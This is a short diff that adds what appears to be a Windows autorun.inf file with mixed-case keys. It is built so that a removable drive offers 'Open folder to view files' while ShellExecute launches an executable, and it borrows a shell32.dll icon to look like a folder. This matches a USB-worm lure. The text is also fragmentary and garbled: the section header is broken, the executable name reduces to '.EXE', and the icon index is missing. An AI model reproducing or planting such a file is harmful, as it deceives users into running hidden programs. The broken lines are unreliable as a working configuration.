@@ -1,0 +1,4 @@
+RUN]aCtioN=Open folder to view files
+
+SHELLexeCUtE=.EXE
+ICon=%SySTEMROoT%\SYSTeM32\SheLl32.DLL,
